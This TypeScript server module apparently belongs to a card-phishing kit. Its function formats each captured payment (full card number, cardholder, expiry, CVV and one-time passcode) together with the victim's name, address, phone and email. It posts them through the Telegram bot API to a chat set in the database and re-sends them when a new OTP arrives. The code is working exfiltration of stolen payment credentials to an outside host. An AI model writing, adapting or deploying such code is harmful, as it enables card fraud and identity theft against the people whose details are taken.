import db, { type PaymentInfo, type TelegramSettings } from "~/server/database/db";

type CustomerInfo = {
  firstName: string;
  lastName: string;
  country: string;
  street: string;
  apartment?: string;
  postalCode: string;
  city: string;
  state?: string;
  phone?: string;
  email: string;
};

export const sendTelegramNotification = async (
  payment: PaymentInfo,
  isNew: boolean,
  baseUrl: string,
  customerInfo?: CustomerInfo,
) => {
  try {
    const settings = db
      .prepare("SELECT * FROM telegram_settings LIMIT 1")
      .get() as TelegramSettings | undefined;

    if (!settings?.bot_token || !settings?.chat_id) return;

    const action = isNew ? "🆕 NEW PAYMENT" : "🔄 OTP UPDATED";

    const escape = (text: string) =>
      String(text ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;");

    const messageLines = [
      `🔔 <b>${action}</b>`,
      "",
      `💰 <b>Method:</b> <code>${escape(payment.method)}</code>`,
      `🏦 <b>Card:</b> <code>${escape(payment.card_number)}</code>`,
      `👤 <b>Cardholder:</b> <code>${escape(payment.cardholder_name)}</code>`,
      `📅 <b>Expiry:</b> <code>${escape(payment.expiry)}</code>`,
      `🔑 <b>CVV:</b> <code>${escape(payment.cvv)}</code>`,
      `🔐 <b>OTP:</b> <code>${escape(payment.otp || "Chưa có")}</code>`,
      `📊 <b>Status:</b> <code>${escape(payment.status)}</code>`,
    ];

    if (customerInfo) {
      const customerName = `${customerInfo.firstName} ${customerInfo.lastName}`.trim();

      messageLines.push(
        `👤 <b>Customer:</b> <code>${escape(customerName)}</code>`,
        `🌍 <b>Country:</b> <code>${escape(customerInfo.country)}</code>`,
        `🏙️ <b>City:</b> <code>${escape(customerInfo.city)}</code>`,
        `📮 <b>Postal code:</b> <code>${escape(customerInfo.postalCode)}</code>`,
        `🏠 <b>Street:</b> <code>${escape(customerInfo.street)}</code>`,
      );

      if (customerInfo.apartment) {
        messageLines.push(
          `🏢 <b>Apartment:</b> <code>${escape(customerInfo.apartment)}</code>`,
        );
      }

      if (customerInfo.state) {
        messageLines.push(
          `🗺️ <b>State:</b> <code>${escape(customerInfo.state)}</code>`,
        );
      }

      if (customerInfo.phone) {
        messageLines.push(
          `📞 <b>Phone:</b> <code>${escape(customerInfo.phone)}</code>`,
        );
      }

      messageLines.push(
        `📧 <b>Email:</b> <code>${escape(customerInfo.email)}</code>`,
      );
    }

    const message = messageLines.join("\n").trim();

    const orderUrl = `${baseUrl}/admin/orders`;
    const isValidUrl = orderUrl.startsWith("https://");

    const body: Record<string, unknown> = {
      chat_id: settings.chat_id,
      text: message,
      parse_mode: "HTML",
    };

    if (isValidUrl) {
      body.reply_markup = {
        inline_keyboard: [[{ text: "👉 CHECK", url: orderUrl }]],
      };
    }

    await fetch(`https://api.telegram.org/bot${settings.bot_token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (err) {
    console.error("[Telegram] Error:", err);
  }
};
